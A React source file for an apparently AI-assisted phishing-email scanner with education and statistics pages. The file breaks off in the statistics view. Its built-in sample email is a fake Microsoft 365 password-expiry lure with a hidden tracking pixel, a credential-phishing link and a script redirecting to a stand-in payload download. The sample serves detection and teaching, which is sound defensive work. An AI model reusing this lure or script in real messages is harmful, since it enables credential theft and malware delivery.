
import React, { useState, useEffect, useRef } from "react";
import ReactDOM from "react-dom/client";
import { GoogleGenAI } from "@google/genai";

// --- Types ---

type Verdict = "SAFE" | "SUSPICIOUS" | "MALICIOUS";

interface AnalysisResult {
  verdict: Verdict;
  riskScore: number; // 0 to 100
  confidence: number; // 0 to 100
  summary: string;
  technicalAnalysis: {
    domainReputation: string;
    authenticationChecks: string;
  };
  passiveAnalysis: {
    hasTrackingPixels: boolean;
    hasDangerousAttachments: boolean;
    hasScriptsOrIframes: boolean;
    details: string;
  };
  socialEngineering: {
    tacticsUsed: string[];
    urgencyLevel: "LOW" | "MEDIUM" | "HIGH";
  };
  webIntelligence: string; // Findings from Google Search
  recommendations: string[];
}

interface GroundingSource {
  title: string;
  uri: string;
}

interface HistoryItem extends AnalysisResult {
  id: string;
  timestamp: number;
  preview: string;
  groundingSources?: GroundingSource[];
}

// --- Sample Data for Simulation ---

const SAMPLE_PHISHING_EMAIL = `Delivered-To: target@company.com
Received: from mail.secure-server-update-88.com (unknown [192.0.2.14])
        by mx.google.com with ESMTPS id ...
Return-Path: <security-alert@secure-server-update-88.com>
From: "IT Security Support" <security-alert@secure-server-update-88.com>
Subject: URGENT: Microsoft 365 Password Expiry Notice
Date: ${new Date().toUTCString()}
To: target@company.com
Content-Type: multipart/alternative; boundary="0000000000009c8e2b05d1234567"

--0000000000009c8e2b05d1234567
Content-Type: text/html; charset="UTF-8"

<html>
  <body>
    <!-- HIDDEN TRACKING PIXEL: Signals to attacker that email was opened -->
    <img src="http://tracker-analytics-bad-actor.com/pixel.png?id=target@company.com" width="1" height="1" style="display:none;" />
    
    <p>ATTENTION USER,</p>
    <p>Our system monitoring indicates that your Microsoft 365 password is set to expire in 2 hours.</p>
    
    <p><a href="http://microsoft-auth-portal-secure-login.com/auth?id=8832">REACTIVATE ACCOUNT NOW</a></p>
    
    <script>
      // MALICIOUS SCRIPT ATTEMPT (Usually blocked by modern clients, but dangerous in vulnerable ones)
      window.location='http://exploit-kit-download.com/payload.exe';
    </script>
  </body>
</html>`;

// --- Components ---

const Icons = {
  ShieldCheck: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>,
  ShieldAlert: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>,
  Search: () => <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>,
  Globe: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>,
  Trash: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>,
  Cpu: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>,
  Bug: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m8 2 1.88 1.88"/><path d="M14.12 3.88 16 2"/><path d="M9 7.13v-1a3.003 3.003 0 1 1 6 0v1"/><path d="M12 20c-3.3 0-6-2.7-6-6v-3a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v3c0 3.3-2.7 6-6 6"/><path d="M12 20v-9"/><path d="M6.53 9C4.6 8.8 3 7.1 3 5"/><path d="M6 13H2"/><path d="M3 21c0-2.1 1.7-3.9 3.8-4"/><path d="M20.97 5c0 2.1-1.6 3.8-3.5 4"/><path d="M22 13h-4"/><path d="M17.2 17c2.1.1 3.8 1.9 3.8 4"/></svg>,
  BookOpen: () => <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>,
  ChartBar: () => <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>,
  Zap: () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>,
  Wifi: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>,
  Activity: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>,
  Terminal: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>,
  EyeOff: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>,
  Lock: () => <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
};

// --- Styles ---

const styles = {
  container: {
    maxWidth: "1400px",
    margin: "0 auto",
    padding: "0 2rem 2rem 2rem",
    minHeight: "100vh",
    display: "flex",
    flexDirection: "column" as const,
  },
  header: {
    padding: "1.5rem 0",
    marginBottom: "2rem",
    borderBottom: "1px solid var(--border-color)",
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between"
  },
  title: {
    fontSize: "2rem",
    fontWeight: "700",
    color: "#fff",
    letterSpacing: "-0.05em",
    display: "flex",
    alignItems: "center",
    gap: "0.75rem",
    textTransform: "uppercase" as const,
  },
  nav: {
    display: "flex",
    gap: "0.5rem",
    marginBottom: "2rem",
  },
  navButton: (active: boolean) => ({
    background: active ? "var(--accent-cyber)" : "transparent",
    color: active ? "#000" : "var(--text-secondary)",
    border: active ? "1px solid var(--accent-cyber)" : "1px solid var(--border-color)",
    padding: "0.75rem 1.5rem",
    borderRadius: "4px",
    cursor: "pointer",
    fontWeight: "700",
    display: "flex",
    alignItems: "center",
    gap: "0.5rem",
    transition: "all 0.2s ease",
    textTransform: "uppercase" as const,
    fontSize: "0.9rem",
  }),
  card: {
    background: "var(--bg-panel)",
    border: "1px solid var(--border-color)",
    padding: "1.5rem",
    boxShadow: "0 0 20px rgba(0,0,0,0.5)",
    borderRadius: "8px",
    marginBottom: "1rem",
  },
  inputCard: {
    background: "var(--bg-panel)",
    border: "1px solid var(--border-color)",
    padding: "0",
    borderRadius: "4px",
    height: "100%",
    display: "flex",
    flexDirection: "column" as const,
    position: "relative" as const,
    overflow: "hidden",
  },
  inputHeader: {
    background: "#1a1a1a",
    padding: "0.75rem 1rem",
    borderBottom: "1px solid var(--border-color)",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    fontSize: "0.8rem",
    color: "var(--text-secondary)",
  },
  inputFooter: {
    background: "#1a1a1a",
    padding: "0.5rem 1rem",
    borderTop: "1px solid var(--border-color)",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    fontSize: "0.7rem",
    color: "#555",
    fontFamily: "monospace",
  },
  textarea: {
    width: "100%",
    height: "100%",
    minHeight: "300px",
    background: "#0a0a0a",
    border: "none",
    padding: "1rem",
    color: "var(--accent-cyber)",
    fontFamily: "monospace",
    fontSize: "0.9rem",
    resize: "none" as const,
    outline: "none",
    flex: 1,
  },
  button: {
    background: "var(--accent-cyber)",
    color: "#000",
    border: "none",
    padding: "1rem 2rem",
    fontWeight: "700",
    cursor: "pointer",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: "0.5rem",
    textTransform: "uppercase" as const,
    letterSpacing: "0.05em",
    transition: "all 0.2s",
    borderRadius: "4px",
    width: "100%",
    marginTop: "1rem",
    fontSize: "1rem",
  },
  buttonOutline: {
    background: "transparent",
    color: "var(--accent-cyber)",
    border: "1px solid var(--accent-cyber)",
    padding: "1rem 2rem",
    fontWeight: "700",
    cursor: "pointer",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: "0.5rem",
    textTransform: "uppercase" as const,
    letterSpacing: "0.05em",
    transition: "all 0.2s",
    borderRadius: "4px",
    width: "100%",
    marginTop: "1rem",
  },
  gaugeContainer: {
    position: "relative" as const,
    width: "200px",
    height: "100px",
    margin: "0 auto",
    overflow: "hidden",
  },
  gaugeBody: (score: number) => ({
    width: "200px",
    height: "200px",
    background: `conic-gradient(from 180deg, var(--accent-safe) 0deg 60deg, var(--accent-warning) 60deg 120deg, var(--accent-danger) 120deg 180deg, transparent 180deg)`,
    borderRadius: "50%",
    transform: "rotate(0deg)", // Base rotation
    position: "absolute" as const,
    top: 0,
    left: 0,
    mask: "radial-gradient(transparent 60%, black 61%)",
    WebkitMask: "radial-gradient(transparent 60%, black 61%)",
  }),
  gaugeNeedle: (score: number) => ({
    width: "2px",
    height: "95px",
    background: "#fff",
    position: "absolute" as const,
    left: "50%",
    bottom: "0",
    transformOrigin: "bottom center",
    transform: `rotate(${ (score / 100) * 180 - 90 }deg)`,
    transition: "transform 1s cubic-bezier(0.1, 1.2, 0.3, 1)",
    boxShadow: "0 0 5px rgba(255,255,255,0.8)"
  }),
  statBarContainer: {
    display: 'flex',
    flexDirection: 'column' as const,
    gap: '0.5rem',
    marginTop: '1rem',
  },
  statBar: (percent: number, color: string) => ({
    height: '24px',
    width: '100%',
    background: '#1a1a1a',
    borderRadius: '4px',
    overflow: 'hidden',
    position: 'relative' as const,
  }),
  statBarFill: (percent: number, color: string) => ({
    height: '100%',
    width: `${percent}%`,
    background: color,
    display: 'flex',
    alignItems: 'center',
    paddingLeft: '0.5rem',
    color: '#000',
    fontSize: '0.75rem',
    fontWeight: 'bold',
    transition: 'width 1s ease-out'
  }),
  ticker: {
    background: "#000",
    borderBottom: "1px solid var(--accent-cyber)",
    color: "var(--accent-cyber)",
    padding: "0.5rem",
    whiteSpace: "nowrap" as const,
    overflow: "hidden",
    fontSize: "0.8rem",
    fontFamily: "monospace",
    marginBottom: "1rem",
  },
  systemStatus: {
    border: "1px solid var(--border-color)",
    background: "#0a0a0a",
    padding: "1rem",
    borderRadius: "4px",
    marginTop: "0",
    height: "100%",
  },
  statusRow: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "0.75rem 0",
    borderBottom: "1px solid #222",
    fontSize: "0.85rem",
    color: "#ccc"
  },
  dot: (active: boolean) => ({
    width: "8px",
    height: "8px",
    borderRadius: "50%",
    background: active ? "var(--accent-safe)" : "#333",
    boxShadow: active ? "0 0 5px var(--accent-safe)" : "none",
    display: "inline-block",
    marginRight: "0.5rem",
    animation: active ? "pulse 2s infinite" : "none"
  }),
  sandboxBanner: {
    background: "rgba(0, 243, 255, 0.05)",
    border: "1px solid var(--accent-cyber)",
    borderRadius: "4px",
    padding: "0.75rem",
    marginBottom: "1rem",
    display: "flex",
    alignItems: "center",
    gap: "1rem",
    fontSize: "0.85rem",
    color: "var(--accent-cyber)"
  }
};

// --- Sub-Components ---

const ThreatTicker = () => {
  const items = [
    "[GLOBAL THREATSTREAM]",
    "DETECTED: Zero-Click Exploits in PDF Readers",
    "ALERT: 'Pixel Tracking' usage up 40% in marketing spam",
    "STATUS: Passive Defense Protocols Active",
    `UPDATED: ${new Date().toLocaleTimeString()}`, 
    "WARNING: Malicious <script> tags found in HTML emails",
    "INTEL: Drive-by download vectors patching required",
    "MONITORING: Silent Execution Attempts"
  ];

  return (
    <div style={styles.ticker}>
      <div className="marquee-content">
        {items.map((item, i) => (
          <span key={`a-${i}`} style={{ display: "inline-flex", alignItems: "center" }}>
            {item}
          </span>
        ))}
        {items.map((item, i) => (
          <span key={`b-${i}`} style={{ display: "inline-flex", alignItems: "center" }}>
            {item}
          </span>
        ))}
      </div>
    </div>
  );
};

const SystemStatusPanel = () => {
  return (
    <div style={styles.systemStatus}>
      <h3 style={{ marginTop: 0, color: "var(--text-secondary)", fontSize: "0.9rem", letterSpacing: "1px", display: "flex", alignItems: "center", gap: "0.5rem" }}>
        <Icons.Cpu /> SYSTEM DIAGNOSTICS
      </h3>
      
      <div style={styles.statusRow}>
        <span><div style={styles.dot(true)}></div>Gemini 2.5 Flash Engine</span>
        <span style={{color: "var(--accent-safe)"}}>ONLINE</span>
      </div>
      <div style={styles.statusRow}>
        <span><div style={styles.dot(true)}></div>Passive Threat Scanner</span>
        <span style={{color: "var(--accent-safe)"}}>ACTIVE</span>
      </div>
      <div style={styles.statusRow}>
        <span><div style={styles.dot(true)}></div>Sandbox Environment</span>
        <span style={{color: "var(--accent-safe)"}}>SECURE</span>
      </div>
      <div style={styles.statusRow}>
        <span><div style={styles.dot(true)}></div>Pixel Tracking Detect</span>
        <span style={{color: "var(--accent-safe)"}}>READY</span>
      </div>

      <div style={{ marginTop: "2rem" }}>
        <h4 style={{ fontSize: "0.8rem", color: "#666", marginBottom: "0.5rem" }}>NETWORK ACTIVITY</h4>
        <div style={{ display: "flex", gap: "2px", alignItems: "flex-end", height: "40px" }}>
          {[...Array(20)].map((_, i) => (
             <div key={i} style={{ 
               width: "100%", 
               background: "var(--accent-cyber)", 
               opacity: 0.3,
               height: `${Math.random() * 100}%`,
               transition: "height 0.5s ease"
             }}></div>
          ))}
        </div>
      </div>
      
      <div style={{ marginTop: "2rem", border: "1px dashed #333", padding: "1rem", borderRadius: "4px" }}>
        <div style={{ fontSize: "0.7rem", color: "#666", marginBottom: "0.5rem" }}>SYSTEM LOG</div>
        <div style={{ fontSize: "0.7rem", fontFamily: "monospace", color: "#444", lineHeight: "1.4" }}>
          > Initializing sandbox...<br/>
          > Loading zero-click exploit signatures...<br/>
          > Parsing HTML for hidden iframes...<br/>
          > Waiting for input stream...
        </div>
      </div>
    </div>
  );
};

const ScannerView = ({ 
  emailText, setEmailText, loading, analyzeEmail, loadSample, result, groundingSources 
}: any) => {
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
      <ThreatTicker />
      
      <div style={styles.sandboxBanner}>
        <Icons.Lock />
        <div>
          <strong>SAFE SANDBOX PROTOCOL:</strong> Analysis is performed on raw text. 
          Pasting email content here PREVENTS your email client from rendering pixels, scripts, or auto-downloading attachments. 
          This is the safest way to inspect suspicious mail.
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 380px", gap: "1.5rem", minHeight: "500px" }}>
        
        {/* Left Column: Input Terminal */}
        <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
          <div style={styles.inputCard}>
            <div style={styles.inputHeader}>
              <span style={{ display: "flex", alignItems: "center", gap: "0.5rem", fontWeight: "bold", color: "var(--accent-cyber)" }}>
                <Icons.Terminal /> SECURE_INPUT_TERMINAL
              </span>
              <span style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
                <div style={styles.dot(!loading)}></div>
                {loading ? "PROCESSING STREAM..." : "AWAITING INPUT"}
              </span>
            </div>
            
            <textarea
              style={styles.textarea}
              placeholder="// PASTE RAW EMAIL HEADERS AND BODY HERE FOR DEEP INSPECTION..."
              value={emailText}
              onChange={(e) => setEmailText(e.target.value)}
              spellCheck={false}
            />

            {loading && <div className="scan-line"></div>}

            <div style={styles.inputFooter}>
              <span>CHARS: {emailText.length}</span>
              <span>ENCODING: UTF-8</span>
              <span>PROTOCOL: SMTP/IMAP</span>
            </div>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem" }}>
            <button 
              style={loading || !emailText ? {...styles.button, opacity: 0.5, cursor: "not-allowed", background: "#333"} : styles.button} 
              onClick={analyzeEmail}
              disabled={loading || !emailText}
            >
              {loading ? (
                <>
                  <span className="spinner"></span> SCANNING...
                </>
              ) : (
                <>
                  <Icons.Bug /> INITIATE SCAN
                </>
              )}
            </button>
            <button
               style={loading ? {...styles.buttonOutline, opacity: 0.5} : styles.buttonOutline}
               onClick={loadSample}
               disabled={loading}
            >
               LOAD SIMULATION DATA
            </button>
          </div>
        </div>

        {/* Right Column: Status or Results */}
        <div style={{ display: "flex", flexDirection: "column", gap: "1rem" }}>
          
          {!result && <SystemStatusPanel />}

          {result && (
            <>
            <div style={{ ...styles.card, borderColor: result.verdict === "SAFE" ? "var(--accent-safe)" : result.verdict === "SUSPICIOUS" ? "var(--accent-warning)" : "var(--accent-danger)" }}>
               <h3 style={{ marginTop: 0, borderBottom: "1px solid #333", paddingBottom: "1rem", display: "flex", justifyContent: "space-between" }}>
                  <span>ANALYSIS REPORT</span>
                  <span style={{ 
                    color: "#000", 
                    background: result.verdict === "SAFE" ? "var(--accent-safe)" : result.verdict === "SUSPICIOUS" ? "var(--accent-warning)" : "var(--accent-danger)",
                    padding: "0.2rem 0.5rem",
                    borderRadius: "4px",
                    fontSize: "0.8rem"
                  }}>
                    {result.verdict}
                  </span>
               </h3>

               <div style={{ marginTop: "1.5rem" }}>
                  <strong style={{ color: "var(--text-secondary)", fontSize: "0.8rem", letterSpacing: "1px" }}>EXECUTIVE SUMMARY</strong>
                  <p style={{ lineHeight: "1.6", color: "#ddd", fontSize: "0.9rem" }}>{result.summary}</p>
               </div>
               
               {/* Passive Threat Section */}
               <div style={{ marginTop: "1.5rem", background: "rgba(255,255,255,0.05)", padding: "1rem", borderRadius: "4px", borderLeft: result.passiveAnalysis.hasTrackingPixels || result.passiveAnalysis.hasScriptsOrIframes ? "3px solid var(--accent-danger)" : "3px solid var(--accent-safe)" }}>
                 <strong style={{ color: "var(--text-secondary)", fontSize: "0.8rem", letterSpacing: "1px", display: "flex", alignItems: "center", gap: "0.5rem" }}>
                   <Icons.EyeOff /> PASSIVE & ZERO-CLICK THREATS
                 </strong>
                 <p style={{ fontSize: "0.85rem", color: "#ccc", marginTop: "0.5rem" }}>
                   {result.passiveAnalysis.details}
                 </p>
                 <div style={{ display: "flex", gap: "0.5rem", marginTop: "0.5rem", flexWrap: "wrap" }}>
                    {result.passiveAnalysis.hasTrackingPixels && <span style={{fontSize: "0.7rem", color: "#000", background: "var(--accent-warning)", padding: "2px 6px", borderRadius: "2px"}}>TRACKING PIXEL DETECTED</span>}
                    {result.passiveAnalysis.hasScriptsOrIframes && <span style={{fontSize: "0.7rem", color: "#fff", background: "var(--accent-danger)", padding: "2px 6px", borderRadius: "2px"}}>MALICIOUS SCRIPT</span>}
                    {(!result.passiveAnalysis.hasTrackingPixels && !result.passiveAnalysis.hasScriptsOrIframes) && <span style={{fontSize: "0.7rem", color: "#000", background: "var(--accent-safe)", padding: "2px 6px", borderRadius: "2px"}}>NO PASSIVE TRIGGERS</span>}
                 </div>
               </div>

               <div style={{ marginTop: "1.5rem" }}>
                 <strong style={{ color: "var(--text-secondary)", fontSize: "0.8rem", letterSpacing: "1px" }}>WEB INTELLIGENCE</strong>
                 <p style={{ fontSize: "0.9rem", color: "var(--accent-cyber)", margin: "0.5rem 0" }}>{result.webIntelligence}</p>
                 {groundingSources.length > 0 && (
                     <div style={{ fontSize: "0.8rem", borderLeft: "2px solid var(--accent-cyber)", paddingLeft: "0.5rem", marginTop: "0.5rem" }}>
                       {groundingSources.map((s: any, i: number) => (
                         <div key={i} style={{ marginBottom: "0.2rem" }}>
                           <a href={s.uri} target="_blank" style={{ color: "#aaa", textDecoration: "none" }}>🔗 {s.title}</a>
                         </div>
                       ))}
                     </div>
                 )}
               </div>
             </div>

             <div style={styles.card}>
                <div style={{ textAlign: "center", marginBottom: "1rem", fontSize: "0.9rem", color: "#888" }}>RISK PROBABILITY</div>
                <div style={styles.gaugeContainer}>
                  <div style={styles.gaugeBody(result.riskScore)}></div>
                  <div style={styles.gaugeNeedle(result.riskScore)}></div>
                </div>
                <div style={{ textAlign: "center", fontSize: "2.5rem", fontWeight: "bold", marginTop: "0.5rem", color: "#fff" }}>
                  {result.riskScore}<span style={{fontSize: "1rem", color: "#666"}}>/100</span>
                </div>
             </div>
            </>
          )}
          
        </div>
      </div>
    </div>
  );
};

const EducationView = () => {
  const [hoveredPart, setHoveredPart] = useState<string | null>(null);

  // Email parts data
  const emailParts = [
    { id: "pixel", label: "<img src='tracker.com/pixel.png' ... > (Hidden)", risk: "HIGH", info: "TRACKING PIXEL: This 1x1 invisible image loads automatically when you open the email. It tells the attacker your IP address, location, and that your email is active." },
    { id: "sender", label: "FROM: Support <admin@g00gle-security.com>", risk: "HIGH", info: "Check the sender domain! 'g00gle-security.com' is NOT 'google.com'. Look for misspellings or unofficial domains." },
    { id: "subject", label: "SUBJECT: URGENT: Final Warning!!", risk: "MED", info: "Phishers use 'Urgency' (Urgent, Final Warning, Immediate Action) to make you panic and act without thinking." },
    { id: "body", label: "We detected unusual activity. Click below to verify your identity or your account will be DELETED.", risk: "HIGH", info: "Threats of account deletion or financial loss are classic social engineering tactics." },
    { id: "link", label: "[ VERIFY ACCOUNT NOW ]", risk: "HIGH", info: "Hover (don't click!) to see the actual URL. If it looks short (bit.ly), messy, or doesn't match the company, it's a trap." }
  ];

  return (
    <div style={{ maxWidth: "1200px", margin: "0 auto" }}>
      <div style={{ textAlign: "center", marginBottom: "3rem" }}>
        <h2 style={{ fontSize: "2.5rem", color: "var(--accent-cyber)", marginBottom: "1rem" }}>ANATOMY OF A PHISH</h2>
        <p style={{ color: "#aaa", maxWidth: "600px", margin: "0 auto" }}>
          Hover over the different parts of this email to learn how to spot both visible AND invisible red flags.
        </p>
      </div>
      
      {/* Education Modules Selector */}
      <div style={{ display: "flex", gap: "1rem", justifyContent: "center", marginBottom: "2rem" }}>
        <div style={{ padding: "1rem", border: "1px solid var(--accent-danger)", borderRadius: "4px", background: "rgba(255,0,85,0.1)", maxWidth: "500px" }}>
            <strong style={{ color: "var(--accent-danger)", display: "block", marginBottom: "0.5rem" }}>NEW: SILENT THREATS (ZERO-CLICK)</strong>
            <p style={{ fontSize: "0.9rem", color: "#ddd" }}>
                Some attacks happen just by <strong>OPENING</strong> an email. Attackers embed invisible images ("pixels") or malicious scripts. 
                Modern email clients try to block these, but older or misconfigured ones are vulnerable.
            </p>
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1.5fr 1fr", gap: "3rem", alignItems: "start" }}>
        
        {/* Interactive Email */}
        <div style={{ 
          background: "#fff", 
          color: "#000", 
          borderRadius: "8px", 
          overflow: "hidden",
          boxShadow: "0 0 30px rgba(0,0,0,0.5)",
          position: "relative"
        }}>
          {/* Hidden Pixel Visualizer */}
          <div 
             onMouseEnter={() => setHoveredPart("pixel")}
             onMouseLeave={() => setHoveredPart(null)}
             style={{ 
                height: "20px", background: "#eee", borderBottom: "1px dashed #ccc", 
                display: "flex", alignItems: "center", justifyContent: "center", fontSize: "0.7rem", color: "#888", cursor: "help",
                backgroundColor: hoveredPart === "pixel" ? "rgba(255, 0, 85, 0.1)" : "#eee"
             }}>
             [ INVISIBLE TRACKING ELEMENT HIDDEN HERE ]
          </div>

          <div style={{ background: "#f5f5f5", padding: "1rem", borderBottom: "1px solid #ddd" }}>
            {emailParts.slice(1, 3).map(part => (
              <div 
                key={part.id}
                onMouseEnter={() => setHoveredPart(part.id)}
                onMouseLeave={() => setHoveredPart(null)}
                style={{ 
                  padding: "0.5rem", 
                  marginBottom: "0.25rem", 
                  cursor: "help",
                  background: hoveredPart === part.id ? "rgba(255, 0, 85, 0.1)" : "transparent",
                  border: hoveredPart === part.id ? "1px solid #ff0055" : "1px solid transparent",
                  borderRadius: "4px",
                  fontWeight: part.id === "sender" ? "bold" : "normal"
                }}
              >
                {part.label}
              </div>
            ))}
          </div>
          <div style={{ padding: "2rem" }}>
            {emailParts.slice(3).map(part => (
               <div 
                key={part.id}
                onMouseEnter={() => setHoveredPart(part.id)}
                onMouseLeave={() => setHoveredPart(null)}
                style={{ 
                  padding: "1rem", 
                  marginBottom: "1rem", 
                  cursor: "help",
                  background: hoveredPart === part.id ? "rgba(255, 0, 85, 0.1)" : "transparent",
                  border: hoveredPart === part.id ? "1px dashed #ff0055" : "1px solid transparent",
                  borderRadius: "4px",
                  display: part.id === "link" ? "inline-block" : "block",
                  color: part.id === "link" ? "blue" : "inherit",
                  textDecoration: part.id === "link" ? "underline" : "none",
                  fontWeight: part.id === "link" ? "bold" : "normal"
                }}
              >
                {part.label}
              </div>
            ))}
            <div style={{ marginTop: "2rem", color: "#666", fontSize: "0.8rem" }}>
              Regards,<br/>
              Security Team
            </div>
          </div>
        </div>

        {/* Explainer Panel */}
        <div style={{ position: "sticky", top: "2rem" }}>
          <h3 style={{ borderBottom: "1px solid #333", paddingBottom: "1rem", color: "#fff" }}>THREAT INTELLIGENCE</h3>
          
          {hoveredPart ? (
            <div style={{ animation: "fadeIn 0.2s" }}>
              {emailParts.filter(p => p.id === hoveredPart).map(p => (
                 <div key={p.id}>
                    <div style={{ 
                      display: "inline-block", 
                      background: p.risk === "HIGH" ? "var(--accent-danger)" : p.risk === "MED" ? "var(--accent-warning)" : "var(--accent-safe)",
                      color: "#000",
                      padding: "0.25rem 0.5rem",
                      fontWeight: "bold",
                      fontSize: "0.8rem",
                      marginBottom: "1rem",
                      borderRadius: "4px"
                    }}>
                      RISK LEVEL: {p.risk}
                    </div>
                    <p style={{ fontSize: "1.2rem", lineHeight: "1.6", color: "#fff" }}>{p.info}</p>
                 </div>
              ))}
            </div>
          ) : (
            <div style={{ color: "#666", fontStyle: "italic", marginTop: "2rem" }}>
              <div style={{ marginBottom: "1rem", fontSize: "3rem", opacity: 0.2 }}>?</div>
              Hover over any section of the email on the left (including the top bar) to analyze its components.
            </div>
          )}
        </div>

      </div>
    </div>
  );
};

const StatsView = () => {
  // Mock data for visualizations
  const topTargets = [
    { name: "Microsoft", percent: 35, color: "#00a4ef" },
    { name: "Google", percent: 22, color: "#4285f4" },
    { name: "Amazon", percent: 18, color: "#ff9900" },
    { name: "Banks/Finance", percent: 15, color: "#00cc66" },
    { name: "Logistics (DHL/FedEx)", percent: 10, color: "#ffcc00" }
  ];

  return (
    <div style={{ maxWidth: "1200px", margin: "0 auto" }}>
      <h2 style={{ fontSize: "2rem", color: "var(--accent-cyber)", marginBottom: "2rem", borderBottom: "1px solid #333", paddingBottom: "1rem" }}>
        GLOBAL PHISHING STATISTICS (2024-2025)
      </h2>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "3rem" }}>
        
        {/* Top Targeted Brands */}
        <div style={styles.card}>
          <h3 style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
            <Icons.ChartBar /> MOST IMPERSONATED BRANDS
          </h3>
          <p style={{ color: "#888", fontSize: "0.9rem", marginBottom: "1.5rem" }}>
            Attackers target trusted ecosystems to harvest credentials.
